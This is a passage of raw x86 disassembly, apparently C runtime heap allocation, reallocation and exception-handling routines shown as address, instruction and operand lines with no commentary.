  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
